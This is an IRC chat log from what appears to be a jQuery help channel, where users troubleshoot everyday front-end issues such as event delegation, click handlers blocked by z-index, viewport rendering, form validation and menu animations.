[05:08:26] <VectorX> Cork give me a sec, i might have got it wrong
[05:08:39] <VectorX> this is a h4, so i realised it doesnt have any children
[05:08:45] <balance> thanks anyway
[05:08:52] <Cork> VectorX: also don't use attr for checked
[05:08:56] <Cork> use prop
[05:08:59] <VectorX> ok
[05:09:03] <Cork> prop('checked', true/false)
[05:09:14] <sacho> NaN?
[05:09:20] <Cork> :)
[05:09:27] <sacho> oh, Infinity.
[05:09:41] <Cork> ya 1/0
[05:10:27] <Cork> schlarpc: , false/true) better? ;)
[05:10:31] <Cork> *sacho:
[05:12:31] <foobar321> IF anyone can help me with this basic stuff http://stackoverflow.com/questions/19426425/jquery-mobile-multi-page-first-page-init
[05:14:25] <sacho> only if you hate checks
[05:16:29] <foobar321> sacho: ?
[05:57:04] <lasha> what's up everyone
[05:57:27] <lasha> anyone built premium plugins before?
[05:57:33] <lasha> (to sell, etc.)
[05:58:13] <Velveeta> if nobody speaks up, that doesn't mean we may not have an answer to your question… i haven't built plugins for sale, myself..
[06:01:05] <lasha> i see.
[06:01:21] <lasha> well, i've built a bunch of plugins for work and stuff, some of them VERY complex
[06:01:38] <lasha> and i'm thinking about refactoring them, packaging them nicely
[06:01:47] <lasha> and selling them with support.
[06:26:26] <Supervan> Can a hacker alter the content inside a php file that was called by $.Ajax
[06:26:38] <Guest51416> is there any plugins out there that add thumbnail previews to the standard colorbox slideshow?
[06:26:39] <slax0r> only if he has access to the web server
[06:26:47] <Cork> SuperMiron: sure, but not through the ajax call
[06:27:04] <SuperMiron> fail
[06:27:33] <SuperMiron> I believe that was directed to Supervan :p
[06:28:40] <Supervan> Users havent got write access
[06:35:48] <x-finite> http://pastebin.com/mt7c7gMB i am using this function to post a form directly from a non server based file .. when i place this file on a web server and access it works perfectly but not when the file is accessed directly on the desktop .. any workaround for this?

[06:54:37] <ThePeach> hi all, I'm trying to build a fallback for the transition on ie9, as I was expecting I can't read the css('transition-property') on the element. Is there a way around this? like read the css property for the transition and then do it via jquery?
[06:57:26] <ThePeach> ok, reading css('transition') works, I'll go with that.
[07:11:31] <dregad> greetings. i'm getting a "Content Security Policy: Directive inline script base restriction violated" error
[07:11:47] <dregad> i'm on FF24, using jquery 1.9.1
[07:12:09] <dregad> this is reproducible with a bare-bone script
[07:12:45] <BillCriswell> dregad: http://stackoverflow.com/questions/8459463/content-security-policy-problems-in-calling-functions-and-display-images This help?
[07:12:51] <dregad> <?php header( "Content-Security-Policy: default-src 'self'" ); ?>
[07:12:51] <dregad> <script type="text/javascript" src="/mantis/javascript/jquery-1.9.1.min.js"></script>
[07:13:00] <dregad> BillCriswell thanks, let me check
[07:13:32] <dregad> actually no
[07:13:38] <dregad> i did read that one before posting here
[07:14:27] <dregad> BillCriswell any other ideas ? :-)
[07:15:25] <BillCriswell> dregad: Not familiar enough with that.
[07:15:38] <webguynow> I had a menu in place with jQuery click() in place;  this stopped working when I moved the menu with some CSS  position:relative and top:-50px  - Anyone had this experience or know how to fix it ?
[07:15:54] <spoon> Anyone know if .focus will work for dynamic elements?
[07:16:30] <dregad> the fact that it triggers the error with nothing in my page except the jquery include, leads me to believe it could be an issue caused by jquery itself
[07:16:32] <BillCriswell> spoon: If you apply it after it's added sure thing. You can also use focusout I think if you want to use event delegation?
[07:16:42] <dregad> btw, http://bugs.jquery.com/ is down, are you guys aware of that ?
[07:17:32] <spoon> webguynow you should probably be using .on('click', ...
[07:18:44] <BillCriswell> ThePeach: I'm not sure on the best way to keep that DRY.
[07:19:18] <webguynow> sure spoon, Does my problem manifest itself because of position:relative;  ??
[07:19:46] <webguynow> I may also check into  z-index  if that's a factor
[07:19:59] <webguynow> if this was a known issue, I thought someone here may know
[07:20:01] <BillCriswell> ThePeach: I think your best bet may be to apply the styles via JS? Doesn't feel right but I think it would keep it the most DRY.
[07:20:06] <BillCriswell> ThePeach: http://ricostacruz.com/jquery.transit/ might be useful?
[07:21:10] <spoon> webguynow that shouldn't cause any issues on the event, is the menu you have static?
[07:21:28] <webguynow> yes, if you mean hard-coded in the html
[07:22:35] <webguynow> once, it's moved, I get click events for the body - but not for the menu
[07:22:51] <ThePeach> BillCriswell: I was it, that might be an idea. the plugin I've written is quite generic so it might be really similar to this.
[07:22:58] <ThePeach> /s/was/saw
[07:23:27] <spoon> Try .on instead, I've been migrating everything to that anyway, it solves a lot of issues
[07:23:32] <webguynow> I'm also toying with how to apply the  position:relative - can do it on individual <li> or parent <div id="menu">
[07:24:55] <Criten>  http://i.imgur.com/hjXaKmg.png Anyone know what is causing that rendering glitch? Using mobile chrome on android. Also has some problems on the iphone5. It seems to only happen on pages that are shorter then the screen height
[07:25:07] <Criten> not really a jquery specific issue... but yeah
[07:25:58] <BillCriswell> ThePeach: I haven't used it but it seems pretty sweet.
[07:26:34] <ThePeach> yep, cheers BillCriswell
[07:26:47] <ThePeach> if not here, I'll use it somewhere else
[07:27:11] <BillCriswell> Criten: Can you replicate it across multiple devices?
[07:27:59] <BillCriswell> Is "some problems on the iphone5" the same as this problem exactly?
[07:28:30] <Criten> BillCriswell, it's a different rendering issue.. it wants to zoom instead of the glitchyness on the bottom
[07:29:00] <Criten> It works fine if i set html { height: (overheightofdevice)px}
[07:29:20] <Criten> but html { height: 100%; } solves nothing
[07:29:31] <BillCriswell> Criten: How about html { overflow: hidden; } ?
[07:29:48] <BillCriswell> Just kind of a shot in the dark there.
[07:30:08] <Criten> yeah.. doesn't change anything
[07:30:33] <Criten> and I don't have any weird styling on html, body, etc
[07:30:43] <BillCriswell> It's tough to know without looking at the code then. I've never seen anything like that.
[07:30:45] <Criten> And it renders fine on desktop browsers
[07:30:51] <Criten> and older iphones
[07:32:03] <Criten> oh... if i get rid of the viewport it fixes it
[07:32:26] <Criten> <meta name="viewport" content="width=device-width">
[07:33:37] <BillCriswell> Criten: How about adding like... initial-scale=1 to it
[07:35:18] <Criten> <meta name="viewport" content="width=device-width, initial-scale=1">, same problem
[07:35:24] <Criten> Hmm.
[07:36:27] <BillCriswell> maximum-scale=1? Not good for usability but just curious if that fixes it.
[07:37:42] <slax0r> isn't there a difference between maximum and initial scale? -.-
[07:38:20] <BillCriswell> There is.
[07:38:45] <Criten> yeah.. you can have initial set to 1 and max set to like 2 so you can zoom out further.. i think
[07:38:50] <jedimind> one is for the intiial scale, one is for the max
[07:38:52] <Criten> or initial to .5 and max to 1
[07:38:54] * jedimind blinks
[07:38:57] <BillCriswell> initial-scale is just how it's scaled from the start, maximum-scale=1 would keep you from zooming.
[07:39:16] <Criten> BillCriswell, it will keep you from zooming out further.. i think
[07:39:38] <Criten> I have just maximum scale=1 set, and i got rid of the width=device-width
[07:39:45] <Criten> and it works.. but doesn't always start zommed out
[07:39:55] <Criten> it just isn't really happy with width-device-width
[07:40:07] <BillCriswell> Criten: Yeah that's weird.
[07:41:51] <Criten> It works fine for every page that's taller then the viewport
[07:42:54] <BillCriswell> min-height it?
[07:43:15] <Criten> I've tried
[07:43:20] <Criten> well..
[07:43:25] <Criten> I mean.. it works with a set value
[07:43:42] <Criten> but I can't lets say.. do body { min-height: 100%; }
[07:43:56] <Criten> but the height of devices varry... so it's kind of a hacky solution to just set it
[07:52:58] <mocas> hi, exist some plugin that return a light color from a color?
[07:55:25] <seutje> mocas: http://css-tricks.com/snippets/javascript/lighten-darken-color/
[07:56:22] <UukGoblin> hi
[07:56:39] <UukGoblin> I have a <p>Foo<span>Bar</span></p> - how do I get the "Foo" text out of it?
[07:56:51] <jarr0dsz> hi everyone i have problem with jquery plugin which always fails with $(...).countdown is not a function
[07:56:51] <UukGoblin> .text() returns FooBar
[07:57:00] <jarr0dsz> i use jquery no conflict but it still fails
[08:09:13] <zizzl> Hey guys is there a plugin for a vertically aligned menu where the sub menu's fly out in a similar fashion like jQuery mobile's main nav slides out from left to right?
[08:16:42] <defaultro> is it bad that our code for desktop and ipad/mobile are on single codebase? I was told they are using responsive reaction, I'm not sure if my term is right
[08:24:56] <Radditz> hello
[08:25:03] <Radditz> does extends work on IE8 ?
[08:25:06] <Radditz> since Object.create doesn't?
[08:29:02] <BillCriswell> Radditz: Try it and see.
[08:29:12] <Radditz> BillCriswell: OH MY HOD
[08:29:24] <Radditz> BillCriswell: I have to try all jquery methods? there is no official support?
[08:30:18] <jedimind> lol
[08:31:05] <BillCriswell> That's always fun.
[08:31:07] <zizzl> hey guys, with this line jQuery(this).children('.sub-menu').show("slow").animate({left: '320'},550); obviously it shows it slowly then animates left to right, anyway to make this happen all at once instead of one after the other?
[08:43:49] <shoky> zizzl: you can use set the "queue" option to false with both .show() and .animate() if you pass in an options object
[08:44:17] <shoky> e.g.  .show({duration:"slow", queue: false})
[08:51:01] <malorie> is there a way to detect scroll-wheel events, even if nothing can currently be scrolled on my page?
[08:52:18] <malorie> to be precise, I'm experimenting a bit, and would like to have a page, that changes some text, or some images when there is a scroll event
[09:11:09] <Ericx2x> I'm using a slideshow library that my client recommended and I have to edit the buttons on this slideshow but I took a look a the documentation and there is no clear way to edit the way the buttons on this slideshow look
[09:13:34] <BillCriswell> Ericx2x: Have to inspect it and work it from there.
[09:18:11] <Bloomberg> Hello Guys!!
[09:18:32] <Bloomberg> How can I get the value of a textareat?
[09:18:41] <sacho>  .text()
[09:18:52] <NoiseEee> val() ;)
[09:21:42] <balance> hi
[09:29:06] <webguynow> I was concerned my anon fx wasn't executing (using FF/FB) but the ready() spits to the console, so I'm good there
[09:29:11] <BillCriswell> Definitely .val()
[09:30:03] <webguynow> but something preventing click event from executing  $(my selector).on('click', function() { blah... }
[09:31:35] <webguynow> ugly.  I have had the actual selector in place, but also put in   $(document).on('click', fx ..  -> Nothing
[09:31:38] <evilcrayon> webguynow, if you're using $.on you need to set $('body').on('click',"selector",function(){};
[09:32:28] <webguynow> right - similar to what I just described
[09:33:51] <sacho> test case please
[09:38:32] <webguynow> evilcrayon: I did put 'body' selector in there, and seem to be getting events on both now
[09:38:49] <evilcrayon> woot
[09:39:03] <webguynow> just not the selector I wanted which is  '#menu li'
[09:39:39] <webguynow> for whatever reason, I've seen some complications with  position:relative  and other position:absolute elements
[09:40:06] <evilcrayon> so $('body').on('click','#menu li',function(){}) won't work?
[09:40:07] <webguynow> but in some of my test, higher z-index  can resolve the issue
[09:40:44] <evilcrayon> Sorry, if I'm making you repeat information, I just got here not too long ago.
[09:40:45] <webguynow> evilcrayon: You'll make my day, if it does
[09:41:32] <webguynow> will check, I've been away from jQuery for too long apparently - was working for Corp Intranet for 1yr+ (J2EE junk)
[09:41:41] <evilcrayon> $('body').on('click','#menu li',function(){
[09:41:42] <evilcrayon>  });
[09:41:48] <evilcrayon> forgot the terminator there.
[09:42:01] <evilcrayon> no worries.
[09:42:49] <Guest51416> are there any libraries like jquery (ie javascript based) which are worth checking out?  Jquery seems to be something of a standard in web design these days
[09:43:11] <evilcrayon> modal is nice
[09:43:50] <duch_kazatel> Guest51416 what sorts of features are you looking for?
[09:44:02] <duch_kazatel> because all in-browser libs are going to be javascript.
[09:44:14] <evilcrayon> sorry, bootstrap modal.
[09:44:30] <evilcrayon> duch is right though, it's going to depend on what you need.
[09:45:16] <duch_kazatel> like, jquery can be great for some things.
[09:45:28] <Guest51416> yeah, i'm talking in browser, javascript libraries.  i guess i could be saying, what's like jquery, cool cutting edge and one day may supercede it
[09:45:42] <duch_kazatel> nothing that i can currently think of.
[09:45:46] <Guest51416> or what is another javascript library worth learning
[09:45:48] <duch_kazatel> there are other useful libs out there.
[09:45:57] <Guest51416> or worth checking out for inspiration
[09:46:05] <duch_kazatel> underscore/lodash are cool, but they complement jquery more than replace it.
[09:46:20] <Guest51416> doug65536: that's fine, i'm just looking for ideas
[09:46:38] <evilcrayon> node.js is really cool.
[09:47:13] <evilcrayon> though probably not the best for a beginner.
[09:47:19] <duch_kazatel> prolly not.
[09:47:32] <duch_kazatel> it's also not really a library - it's a way to run JS outside of the browser.
[09:47:40] <zizzl> is there a way to change the .show() animation so its not from corner to corner?
[09:47:49] <zizzl> and maybe just slides out from left to right
[09:47:56] <Armistice> I'm having a small problem. I am generating a form dynamically and I cannot add an event listener. http://jsfiddle.net/EtFYg/1/ here is sort of what I'm doing in a nutshell, and as you see if you submit the form then the submit handler isn't really doing anything...
[09:48:14] <duch_kazatel> zizzl check this part of the docs: http://api.jquery.com/show/#show-options
[09:48:47] <duch_kazatel> Armistice you're binding a listener to something that doesn't yet exist.
[09:49:02] <duch_kazatel> you need to either bind the listener AFTER you've create the form, or use event delegation.
[09:49:24] <duch_kazatel> i'm personally a fan of the latter method.
[09:49:39] <Armistice> duch_kazatel: yes I'm aware of this. Haven't heard of event delegation before. I'll look it up
[09:50:43] <Guest51416> duch_kazatel: evilcrayon thanks for the suggestions
[09:50:49] <Armistice> Oh duch_kazatel I'm using .on but I figure the second parameter must be the element you want to sort of bind the event to? I was putting it all in the jquery selector which I suppose may be the problem
[09:51:10] <duch_kazatel> Armistice nope.
[09:51:16] <duch_kazatel> Armistice http://api.jquery.com/on/#direct-and-delegated-events
[09:51:39] <duch_kazatel> the idea is $(parentThatExist).on('event', 'element', function(){})
[09:52:09] <duch_kazatel> that uses event delegation - basically, when you, say, click a link, the click event bubbles up through the document.
[09:52:29] <duch_kazatel> you can add listeners to see if, for instance, a child link was clicked.
[09:52:49] <duch_kazatel> this is nice because dynamically added elements withh still bubble, so you don't have to bind them on creation.
[09:53:05] <duch_kazatel> s/withh/will
[09:53:44] <duch_kazatel> you can simply attach your single event listener and it handles all future stuff for you.
[09:54:20] <duch_kazatel> however, you DON'T want to do something like $('body).on('click', 'a', function(){}) because you're then watching every click on every anchor, which can get messy.
[09:54:47] <duch_kazatel> rather, $('body').on('click', 'a', function(){})
[09:55:43] <duch_kazatel> hopefully that made sense.
[09:56:36] <balance> Hi, I need to make a table and each column title should be the date. from now till next summer (or something). Any recommendations? I just need the date info, not a full calendar tool.
[09:59:30] <JFranks> I am trying to figure out why the multi-header option in http://tablesorter.com/docs/example-widgets.html doesn't work for me while everything else does.. Here's my attempt at making an external example: http://jsbin.com/aceyEmi/1/edit
[09:59:55] <JFranks> NIX That..
[09:59:56] <JFranks> Sorry
[10:00:57] <webguynow> evilcrayon: I did pastebin this stuff  RoadHelper jQuery
[10:00:59] <webguynow> http://pastebin.com/sP3iD7KK
[10:01:11] <webguynow> going to look Really Odd without the images
[10:03:20] <evilcrayon> just got back, I'm looking at it now.
[10:03:41] <evilcrayon> I'm gonna move it over to fiddle.
[10:04:22] <webguynow> ya, OK great,  Something so simple
[10:06:32] <evilcrayon> webguynow, what are we trying to do again?
[10:08:47] <webguynow> elementary code, and I was changing color of div   menu  li  a  <div>  - based on a click
[10:09:19] <webguynow> no real link involved, this is just a throw-away prototype on something
[10:09:52] <webguynow> actually, I had hacked out my code that does this, and just  console.log()  a few things and find the event target
[10:10:02] <evilcrayon> Okay, I remember now.
[10:10:36] <webguynow> in console - my selector working find  $('#menu li') shows the array
[10:10:44] <webguynow> or I can just get 1st one   [0]
[10:10:53] <webguynow> working fine
[10:11:53] <webguynow> OK since I've been away from jQuery - someone indulge me...
[10:12:10] <webguynow> $('#menu li')  old style ( not the beer, ha )
[10:12:57] <webguynow> $('body').on('click', '#menu li', function() ...      new style - since when did 2nd Sel param come into jQuery ?
[10:13:13] <duch_kazatel> webguynow err.
[10:13:17] <duch_kazatel> those both do two different things.
[10:13:35] <evilcrayon> on is great for ajax elements
[10:13:54] <zizzl> Sorry for the rookie question, but where would I add "queue: false" in this line .... jQuery(this).children('.sub-menu').show("slide", { direction: "left" }, 300);
[10:13:55] <duch_kazatel> webguynow $('#menu li') selects all li's that are children of #menu, like CSS.
[10:13:56] <evilcrayon> .click is for an event where ajax isn't effecting the dom.
[10:14:10] <webguynow> $('#menu li').on('click', fx....   old way
[10:14:25] <duch_kazatel> webguynow that's still valid.
[10:15:08] <grafi> but sucky
[10:15:10] <grafi> :y
[10:15:13] <evilcrayon> he's right.
[10:15:24] <duch_kazatel> webguynow .on() has to bind to something that exists.  if it doesn't exist when you run the bind, then there's nothing to bind to.
[10:15:42] <duch_kazatel> the second version you're seeing makes use of event delegation.  I talked about it earlier.
[10:16:47] <zizzl> ** anyone?
[10:17:13] <sacho> queue:false?
[10:17:44] <duch_kazatel> inside the show()
[10:18:32] <zizzl> duch_kazatel, maybe I'm missing brackets or something can u show me?
[10:21:11] <duch_kazatel> zizzl wat?
[10:22:00] <duch_kazatel> zizzl does that code run for you?
[10:22:29] <zizzl> it runs but I'm running into something where if I hover too quickly the sub menu stays out there
[10:22:31] <webguynow> evilcrayon: PM if that fiddle revealed any conclusions
[10:23:27] <evilcrayon> webguynow instead of event.target; I think you're looking for $(this).addClass();
[10:23:35] <evilcrayon> it doesn't have to be addClass
[10:24:01] <evilcrayon> but $(this) will let you manipulate the element that was clicked.
[10:25:03] <duch_kazatel> zizzl something like this: jQuery(this).children('.sub-menu').show({duration:300,easing:'slide',direction:'left',queue:false});
[10:25:08] <duch_kazatel> no guarantee that code works.
[10:27:17] <balance> I need to get a range of dates. I need to make a table and each column should have a date. It always +1. BUt not from today.
[10:27:46] <duch_kazatel> balance do you have any code yet?
[10:28:12] <balance> duch_kazatel no, I'm not sure what do use. I'm not askign for code. Does datepicker work fine for this?
[10:28:37] <duch_kazatel> balance no.  why do you need this?
[10:29:10] <balance> duch_kazatel What do you mean by why do I need this? Because the application is specified like that?
[10:29:22] <balance> duch_kazatel it's something like a task table
[10:29:31] <duch_kazatel> balance for scheduling or something?
[10:30:18] <duch_kazatel> either way, you can do it in native javascript.  check out the date object.
[10:30:32] <balance> duch_kazatel yes, I just started a new education/school (however you say it in englisch) and we have plan for the whole semester. I want to create an overview over every subject etc.
[10:30:32] <duch_kazatel> datepickers would be nice to specify your start/stop dates.
[10:30:54] <balance> duch_kazatel thanks, somehow I didn't find the date object (in my rather small search though) thanks
[10:31:20] <duch_kazatel> i'd really reccommend using something like google calendar in that case, but if you really need to roll your own, knock yourself out.
[10:31:30] <balance> duch_kazatel Should be possible to set the date object back in time
[10:31:52] <balance> duch_kazatel no, I don't want a calendar. It's a bit different
[10:32:20] <duch_kazatel> balance you want to make a schedule of events?
[10:32:37] <balance> yes, but calendar doesn't fit. It would fit, but it kind of sucks.
[10:33:33] <duch_kazatel> err, that's exactly what they're for, but if it doesn't serve your needs, check out the date object in javascript and look into how to make tables.
[10:35:28] <evilcrayon> webguynow: I was having some issues with jsfiddle but here's the pastebin http://pastebin.com/mtMcPxcS hopefully that helps.
[10:35:52] <webguynow> evilcrayon: OK, thx for the help; But it's clear the event is not firing
[10:36:16] <evilcrayon> yeah, it's using a div inside of an achor.
[10:36:38] <webguynow> I'll look. thx
[10:36:42] <duch_kazatel> webguynow the event is firing unless something is preventing it or something is stopping propogation.
[10:36:42] <evilcrayon> using developer tools, you can see that the anchor is actually collapsed.
[10:36:57] <balance> duch_kazatel I want an overview and need a lot more space then google calender has and also need to make some own imports from excel. Should end up like this http://jsfiddle.net/psLyF/ also, I might extend it to some file sharing and chatting etc.
[10:36:59] <evilcrayon> So what you're actually clicking is the div.
[10:37:19] <webguynow> Yes, I want to click the div - correct
[10:37:30] <webguynow> I've used selector  ('#menu li')
[10:37:45] <duch_kazatel> balance everything you've just talked about is stuff that google apps provides.
[10:37:50] <webguynow> anchor is actually collapsed -  does this mean something
[10:38:14] <evilcrayon> in your code you were firing on #menu a
[10:38:21] <balance> duch_kazatel so e.g.? A normal calendar doesn't fit this at all.
[10:38:27] <evilcrayon> but what you were clicking was #menu div
[10:38:47] <webguynow> I've had a few versions, so that mistake on my part, is possible
[10:39:06] <evilcrayon> oh okay.
[10:39:14] <evilcrayon> let me try once more.
[10:39:53] <duch_kazatel> balance feel free to try your way, but there's a reason calendar apps are built they way they are.
[10:41:04] <webguynow> Now, if I do a test, on  ('body').on('click', ...
[10:41:19] <webguynow> can I actually find the actual element that was clicked ?
[10:41:34] <duch_kazatel> webguynow sure - $(this)
[10:41:40] <duch_kazatel> if you use event delegation.
[10:41:45] <evilcrayon> ^ what he said
[10:41:45] <duch_kazatel> otherwise you're looking a all clicks on body.
[10:42:09] <webguynow> I got around some z-index issues before
[10:42:15] <balance> duch_kazatel I only need to see when to have done what. I work on these tasks the whole week. A calendar like google has it doesn't provide this overview. Also, google doesn't allow import like i want it (quite sure). If there is a possibility to change the google canlendar to the view I want, please tell me. Don't liek working for nothing :P BUt I really don't want a normal calendar.
[10:42:26] <balance> duch_kazatel and thanks
[10:42:39] <webguynow> so what do I have to do ?  event delegation  is a given
[10:42:41] <duch_kazatel> balance you're going to make something that most people aren't going to find usable.
[10:42:45] <webguynow> I thought
[10:42:58] <duch_kazatel> webguynow back up - what are you trying to do?
[10:43:11] <webguynow> look up 10 lines, ha
[10:43:33] <webguynow> find the actual element that was clicked
[10:43:42] <duch_kazatel> don't bind to body.
[10:43:45] <duch_kazatel> that's a bad thing to do.
[10:43:54] <evilcrayon> why?
[10:43:56] <ajpiano> whaaaat
[10:43:59] <ajpiano> are you talking about duch_kazatel
[10:44:07] <ajpiano> yes, you should probably bind to document, rather than body
[10:44:21] <ajpiano> webguynow: look inside of the event object
[10:44:25] <balance> duch_kazatel I'm doing it for my own, I'll share it with those for find it good. I can't work with normal calendars, never liked any of them at all.
[10:44:32] <evilcrayon> he said document wasn't working, so I suggested body.
[10:44:42] <duch_kazatel> no, bind further down.  otherwise you're going to execute logic on every single click.
[10:45:00] <evilcrayon> Even though he specified a selector?
[10:45:08] <duch_kazatel> correct.
[10:45:35] <evilcrayon> $('header').on() ?
[10:45:44] <duch_kazatel> when using delegation.
[10:45:50] <evilcrayon> would that be better?
[10:46:02] <duch_kazatel> binding to a parent element that exists.
[10:46:11] <duch_kazatel> like the containing div.
[10:46:23] <ajpiano> webguynow: event.target
[10:47:08] <ajpiano> it's good to do event delegation on the lowest shared parent that exists, but binding on document/body is not likely to be an actual performance drain
[10:47:42] <duch_kazatel> i just prefer to not filter EVERY CLICK that happens inside of body.
[10:48:53] <balance> duch_kazatel can you please tell me why you are thinking so? Basically I'm just replacing the time with subjects. You can't add anything on your own. It's really only for a basic overview. I'm intrested in you critics.
[10:49:41] <Ericx2x> hey guys, can someone inspect this element for the buttons on this slideshow and tell me how to style them differently? http://adapt2.erictheprogrammer.com/
[10:49:54] <evilcrayon> webguynow: http://jsfiddle.net/da4ZH/
[10:50:12] <evilcrayon> developer tools couldn't find your header element for some reason.
[10:50:26] <evilcrayon> so I changed it to a div.
[10:51:51] <duch_kazatel> balance can't really help you there duder.  honestly a plain old calendar would perfectly suit your needs imo, but that apparently doesn't work.  i don't see the value in telling people they have to do 2 subjects on a day, but that's me.
[10:51:57] <webguynow> evilcrayon: You are right ( at least in the right direction )
[10:51:59] <evilcrayon> also I changed your consol.log to an alert.
[10:52:35] <webguynow> my header which had a  z-index: -10   was causing some futz-up and event not captured
[10:52:54] <webguynow> maybe this new style can help
[10:53:11] <webguynow> either ('header #menu li')
[10:53:27] <webguynow> or  ('header').on('click',
[10:53:42] <webguynow> ('header').on('click', '#menu li', fx..
[10:53:55] <evilcrayon> I tried ('header').on first but that didn't seem to fire.
[10:55:10] <balance> duch_kazatel okay. Maybe you should be in the situation I am. Anyway, I think it's better. DO you know if google calendar supports auto import from excel? With own rules?
[10:55:27] <duch_kazatel> balance it might.  haven't really needed that kind of functionality tbh.
[10:55:46] <balance> duch_kazatel okay, thanks
[10:55:48] <duch_kazatel> and webguynow you're trying to trigger on those links that say "dashboard", "dispatch", etc?
[10:58:13] <evilcrayon> webguynow: see what you mean about the z-index, removed it and updated the code to reflect changes http://jsfiddle.net/da4ZH/4/
[10:59:25] <evilcrayon> time for work, bye all.
[11:00:33] <duch_kazatel> enjoy
[11:00:43] <webguynow> thx
[11:00:53] <sasmit87> Hi anybody have used jquery validator plugin ??
[11:04:28] <sasmit87> http://dev.freshersworld.com/user/register  here I need to validate according to check of radio buttons
[11:05:55] <sasmit87> I mean cgpa range is 3 to 10 and percentage range is 30 to 100. that is validating onblur of that text filed but I want it to happen on check of radio buttons also
[11:06:29] <sasmit87> here is my custom validator code http://paste.ofcode.org/dJcZWwwLhNydS4a7zxFA24
[11:07:39] <sasmit87> and in rules I define marks:  marks{required:true,range:[30,100]},
[11:07:41] <sasmit87> 					
[11:07:42] <sasmit87> 					
[11:07:44] <sasmit87> 				
[11:10:51] <sasmit87> any help??
[11:11:40] <sasmit87> OMG 917 users are there in this channel. but strange nobody is replying from last 10 mins
[11:16:12] <duch_kazatel> sasmit87 probably because people are working or doing something else.
[11:16:46] <duch_kazatel> there's also the chance that there are folks that haven't used your plugin here.  if there are, they might not be paying attention.
[11:18:29] <jphase> sasmit87: just bind to the submit event on the form, do some if statements to see if your things radio is checked and the value is between 30 and 100 and add an error class to the form and return false if it doesn't meet your criteria
[11:19:29] <zizzl> Hey guys I have this jQuery here http://jsfiddle.net/PxbMF/ (it's so when you hover over an element with a sub-menu it flys out from left to right) and it's working fine except for that if you hover quickly over a few items with sub menus, the sub-menus don't disappear like they do when you do it slowly
[11:19:31] <zizzl> any suggestions??
[11:19:45] <zizzl> it's been driving me nuts for hours
[11:21:35] <grafi> html and css are missing zizzl
[11:22:00] <zizzl> grafi, I tried adding it and it's failing at looking anything like my dev site
[11:22:11] <zizzl> was hoping some pro could see something right off the bat
[11:23:21] <bberry> so i am programmatically using selectors like doing $("#"+domobjectname).val('stuff'). If the selector isnt found, it returns undefined.  Then it breaks out of the loop that its in.  Is there a way that i can check to see if the selector exists?
[11:23:22] <bberry> er
[11:23:23] <jphase> sasmit87: This is how I do similar custom validation on a form using jQuery validator (this is in addition to my .validate() method)   http://hastebin.com/xulureladi.coffee    -   you'll obviously have to change the selectors and the conditions in which valid = true;  but that's how you do it without using their "depends" API call
[11:23:27] <bberry> the selected DOM element exists
[11:23:41] <duch_kazatel> bberry sure - check the .length property.
[11:23:55] <sasmit87> jphase: I don't understand why to bind to submit event on the form. I even need without submit validation
[11:24:05] <bberry> mmk ill look at that
[11:24:23] <zizzl> grafi, http://jsfiddle.net/8X576/3/ it's supposed to have the sub-menu's on display:none but for some reason its appling block in the fiddle
[11:24:40] <sasmit87> first time only u have to click on submit button then no submit ..u need to validate on form elements
[11:24:51] <jphase> sasmit87: In my case, I needed to validate the form on submit and use custom validation that prevents the form from submitting
[11:25:27] <jphase> sasmit87: you can bind to any event you want, and run any logic you want before adding the error classes to the elements that are erroneous
[11:25:41] <sasmit87> okay
[11:25:58] <bberry> duch_kazatel: yep, that works, thanks m8 :D
[11:26:03] <duch_kazatel> bberry np
[11:26:17] <grafi> cool zizzl, I will have a look now
[11:26:46] <zizzl> grafi thanks so much man
[11:28:31] <bberry> anyone have a input text box widget that theyd recommend?
[11:28:39] <bberry> i looked in jquery UI and there doesnt seem to be anything
[11:29:01] <jphase> jQuery UI has modal dialogs that will work with that
[11:29:15] <jphase> you just have to make them your own is all
[11:30:38] <slick-> can someone please help me out, how can i rewrite this function in jquery
[11:30:43] <slick-> without changing functionality: http://jsfiddle.net/fzk5E/
[11:30:58] <snover> bberry: dojo dijit widgets
[11:32:55] <slick-> http://jsfiddle.net/fzk5E/1/ **
[11:33:02] <slick-> can someone please tell me another way of doing this
[11:33:25] <duch_kazatel> slick what are you trying to accomplish?
[11:34:42] <slick-> instantiate an object
[11:34:43] <slick->  jQuery('[data-person]').person();
[11:34:46] <slick-> another way of doing his?
[11:34:57] <duch_kazatel> "instantiate an object" wat.
[11:35:34] <boze> How could I get $.each to output a list instead of a comma dilimeted string? http://jsfiddle.net/fP7nG/
[11:36:52] <slick-> duch_kazatel:
[11:36:54] <slick-> "Create a plugin called Person (person.js) so that the <script> block becomes like the following but no change in functionality. No hard-coding is allowed:"
[11:37:11] <BillCriswell> boze: http://jsfiddle.net/fP7nG/1/ This works. You can't use $.each in there like that.
[11:37:11] <duch_kazatel> boze you'll have to iterate through each object in the array and add it to a <ul>
[11:37:19] <NoiseEee> slick-: so getting someone to give you the answer is acceptable for your homework/test/whatever it is?
[11:37:23] <NoiseEee> slick-: laaaaaaaaaaaaaaaaaaaaaame
[11:37:34] <duch_kazatel> slick- yeah not doing that for you.
[11:37:43] <slick-> dont do it
[11:37:47] <slick-> just help me understand it
[11:37:59] <slick-> isn't that just instantiating an object?
[11:38:01] <slick-> in jquery?
[11:38:05] <slick->  jQuery('[data-person]').person();
[11:38:11] <boze> BillCriswell: tyvm that is super sexy
[11:38:17] <BillCriswell> boze: '<ul><li>' + list.join('</li><li>') + '</li></ul>'); would be quicker!
[11:38:28] <duch_kazatel> hah that would work.
[11:39:29] <zizzl> grafi any luck?
[11:39:47] <grafi> not yet :|
[11:39:59] <grafi> i can easily see how you spent hours on that already :D
[11:40:28] <zizzl> grafi haha
[11:41:19] <zizzl> BillCriswell.. I have this jQuery here http://jsfiddle.net/PxbMF/1/ (it's so when you hover over an element with a sub-menu it flys out from left to right) and it's working fine except for that if you hover quickly over a few items with sub menus, the sub-menus don't disappear like they do when you do it slowly
[11:41:29] <zizzl> sorry to call you out, but you've helped me a few times before and you always nail it
[11:43:20] <sportman> so this sounds silly, but i'm using query toggle class, and animating it using query ui
[11:43:39] <sportman> it seems that it animates when the class is added, but when it removes it doesn't look like it animates, is there something i would be doing wrong?
[11:44:24] <grafi> zizzl http://jsfiddle.net/8X576/4/ this seems to work, its more like the rusty old hammer solution though
[11:45:14] <boze> BillCriswell: join is the winner, thanks again
[11:45:14] <grafi> maybe you should also consider using something like hoverintent, so the animation doesnt start when the mouse is just flying over the elements
[11:45:41] <BillCriswell> boze: No problem!
[11:45:48] <grafi> hi BillCriswell
[11:45:49] <grafi> :)
[11:45:50] <BillCriswell> zizzl: I agree with grafi about the hover intent issue.
[11:45:53] <BillCriswell> Howdy!
[11:46:07] <BillCriswell> well.. hover intent suggestion
